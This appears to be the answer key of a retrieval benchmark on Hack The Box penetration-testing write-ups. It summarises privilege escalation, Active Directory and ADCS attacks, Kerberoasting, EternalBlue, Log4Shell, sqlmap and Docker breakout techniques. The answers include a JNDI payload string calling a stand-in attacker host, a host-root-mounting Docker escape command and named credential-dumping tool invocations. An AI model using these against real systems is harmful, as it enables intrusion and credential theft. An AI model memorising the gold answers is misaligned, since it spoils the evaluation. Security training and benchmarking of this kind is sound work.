# HTB RAG – Answer Key

> Calibrated canonical gold-standard benchmark representing core techniques and primary HTB machines.
> Raw uncurated grep backup is safely preserved in `eval/answer_key_raw_grep.md`.

---

## Broad Questions

---
**Q1** | Windows privilege escalation cheatsheet
Machines: htb-devel, htb-optimum, htb-tally, htb-worker, htb-bastard, htb-sauna, htb-acute, htb-bruno, htb-heist, htb-nanocorp
Answer: Windows privesc techniques include token impersonation (Potato family), SeImpersonatePrivilege abuse, SAM/SYSTEM hive dumps, unquoted service paths, DLL hijacking, AlwaysInstallElevated, PrintSpoofer, NTLM relay to ADCS, WCF service injection, NSClient++ exploits, and AD-integrated DNS abuse.

---

---
**Q2** | Linux privilege escalation cheatsheet
Machines: htb-bashed, htb-shocker, htb-knife, htb-traverxec, htb-jarvis, htb-valentine, htb-cronos, htb-bamboo, htb-devvortex, htb-expressway
Answer: Linux privesc techniques include sudo misconfiguration, SUID binary abuse, cron job hijacking, kernel exploits (DirtyCow CVE-2016-5195), capability abuse, NFS misconfiguration, writable /etc/passwd, PATH hijacking, Docker/LXD group escape, PAM cache symlink attacks, and snapd vulnerabilities.

---

---
**Q3** | Active Directory attack techniques cheatsheet
Machines: htb-active, htb-forest, htb-sauna, htb-delegate, htb-administrator, htb-rebound, htb-escape, htb-blackfield, htb-sizzle, htb-intelligence
Answer: AD techniques include AS-REP Roasting, Kerberoasting, DCSync, BloodHound enumeration, NTLM relay, constrained/unconstrained delegation abuse, RBCD, Shadow Credentials, ACL abuse (GenericAll, WriteDACL, WriteOwner), Golden/Silver ticket, Pass-the-Hash, GMSA password extraction, and ADCS certificate abuse (ESC1-ESC9).

---

---
**Q4** | ADCS certificate abuse techniques
Machines: htb-certified, htb-escape, htb-escapetwo, htb-coder, htb-manager, htb-darkzero, htb-mirage, htb-mist
Answer: ADCS abuse techniques include ESC1 (misconfigured certificate templates), ESC4 (template ACL abuse), ESC7 (CA officer approval bypass), ESC8 (NTLM relay to HTTP enrollment), ESC9 (GenericWrite on certificate template), Shadow Credentials via certipy, and certificate-based authentication for privilege escalation.

---

---
**Q5** | Password cracking and hash dumping techniques
Machines: htb-active, htb-sauna, htb-forest, htb-blackfield, htb-devel, htb-vintage, htb-darkcorp, htb-shibboleth, htb-tentacle
Answer: Techniques include secretsdump.py (SAM/NTDS.dit extraction), hashcat/john for cracking NTLM/NTHash/bcrypt/MD5, mimikatz for in-memory credential harvesting, AS-REP hash cracking, Kerberoast hash cracking, credential extraction from config files/databases, and DCSync for domain hash dumping.

---

## Specific Questions

---
**Q6** | Kerberoasting in Active Directory
Machines: htb-active, htb-forest, htb-sauna, htb-sizzle, htb-rebound, htb-blackfield, htb-administrator
Answer: Kerberoasting targets Active Directory service accounts configured with Service Principal Names (SPNs). An authenticated domain user requests a Kerberos TGS ticket for the target SPN from the Domain Controller. The ticket is encrypted with the service account's NTLM password hash. The attacker extracts the ticket offline and cracks the password hash using hashcat (mode 13100) or john. Common tools include GetUserSPNs.py (Impacket), Rubeus, and Invoke-Kerberoast.

---

---
**Q7** | MS17-010 EternalBlue exploitation
Machines: htb-blue, htb-legacy
Answer: MS17-010 (CVE-2017-0143 / EternalBlue) is a critical remote code execution vulnerability in the SMBv1 protocol in Windows. It allows unauthenticated attackers to execute arbitrary shellcode in kernel space over SMB port 445, granting immediate NT AUTHORITY\SYSTEM access. Common tools and exploit modules include Metasploit (exploit/windows/smb/ms17_010_eternalblue) and standalone Python exploits (e.g. zzz_exploit.py / checker.py). Demonstrated on Blue and Legacy.

---

---
**Q8** | CVE-2021-44228 Log4Shell RCE
Machines: htb-crafty, htb-logforge
Answer: CVE-2021-44228 (Log4Shell) is an unauthenticated Remote Code Execution flaw in the Apache Log4j library resulting from improper validation of JNDI lookups (e.g. ${jndi:ldap://attacker:1389/Exploit}). Attackers trigger the lookup by injecting malicious strings into HTTP headers, chat messages, or input fields. A rogue LDAP or RMI referral server (such as marshalsec or JNDIExploit) serves a payload class which the vulnerable host deserializes and executes. Demonstrated on Crafty and Logforge.

---

---
**Q9** | SQL injection with sqlmap
Machines: htb-jarvis, htb-europa, htb-falafel, htb-cache, htb-shared, htb-faculty, htb-enterprise, htb-trick
Answer: sqlmap is an automated tool used to detect and exploit SQL injection vulnerabilities in web applications. On HTB machines, it is leveraged to enumerate databases (--dbs), dump sensitive tables and user credential hashes (--dump), test stacked queries or time-based blind SQLi, read arbitrary files (--file-read), or achieve remote OS command execution (--os-shell). Demonstrated on Jarvis, Europa, Falafel, Cache, Shared, and Faculty.

---

---
**Q10** | Docker container breakout
Machines: htb-carpediem, htb-runner, htb-pikatwoo, htb-extension, htb-monitors, htb-talkative, htb-feline
Answer: Docker breakout techniques on HTB include: 1) Abusing exposed or mounted Docker sockets (/var/run/docker.sock) to spawn a new privileged container mounting the host's root directory (docker run -v /:/host -it alpine chroot /host); 2) Exploiting containers run with --privileged by mounting host disk devices or using cgroups release_agent execution (CVE-2022-0492 on Carpediem); 3) Exploiting container runtime vulnerabilities like runc (CVE-2024-21626 on Runner, cr8escape on Pikatwoo); and 4) Abusing membership in the local docker group on the host.

---

---
**Q11** | Token impersonation via JuicyPotato / PrintSpoofer
Machines: htb-tally, htb-worker, htb-cereal, htb-bruno, htb-fighter, htb-conceal, htb-json
Answer: Windows service accounts (such as IIS APPPOOL or LOCAL SERVICE) often possess SeImpersonatePrivilege. Attackers abuse this by tricking a high-privileged account (such as NT AUTHORITY\SYSTEM) into authenticating to a local rogue RPC/COM server. JuicyPotato coerces authentication via DCOM using specific CLSIDs, while PrintSpoofer coerces authentication via the named pipe of the Print Spooler service (\\.\pipe\spoolss). Once the SYSTEM token is captured, the exploit calls CreateProcessWithTokenW to spawn a shell with elevated SYSTEM privileges.

---

---
**Q12** | DCSync attack
Machines: htb-sauna, htb-forest, htb-delegate, htb-administrator, htb-sizzle, htb-vintage, htb-ghost, htb-blackfield
Answer: DCSync mimics the behavior of an Active Directory Domain Controller using the Directory Replication Service (DRS) Remote Protocol (MS-DRSR). By requesting replication of user objects via GetNCChanges, an attacker with replication permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) can dump the password hashes of any domain account—including the krbtgt account and Domain Admins—from NTDS.dit without running code on the DC itself. Executed using Impacket's secretsdump.py -just-dc or Mimikatz lsadump::dcsync.

---

---
**Q13** | SUID binaries and GTFOBins Linux privesc
Machines: htb-jarvis, htb-traverxec, htb-knife, htb-mango, htb-forwardslash, htb-writer, htb-sunday, htb-conversor
Answer: SUID (Set Owner User ID up on execution) binaries run with the permissions of the file owner (typically root). Attackers enumerate them via find / -perm -4000 -type f 2>/dev/null. If a binary is misconfigured, vulnerable, or listed on GTFOBins (such as bash, nmap, vim, python, find, cp, systemctl, or custom SUID binaries), attackers exploit built-in functionality (e.g. shell escapes, arbitrary file read/write, shared library loading) to escalate privileges to root.

---

---
**Q14** | WinRM / evil-winrm shell access
Machines: htb-active, htb-sauna, htb-forest, htb-cascade, htb-remote, htb-blackfield, htb-delegate, htb-infiltrator, htb-blazorized, htb-administrator
Answer: Evil-WinRM is used for remote PowerShell shell access over WinRM (port 5985/5986). Used with plaintext passwords, NTLM hashes (pass-the-hash), or certificates. Requires target user to be in Remote Management Users group. Common contexts: post-exploitation lateral movement, using recovered credentials, or after ADCS certificate abuse.

---

---
**Q15** | Samba RCE
Machines: htb-abducted, htb-lame
Answer: Samba RCE exploits include CVE-2007-2447 (Samba 3.0.20 username map script command injection, exploited on Lame via Metasploit) and Samba printer command injection (exploited on Abducted).

---
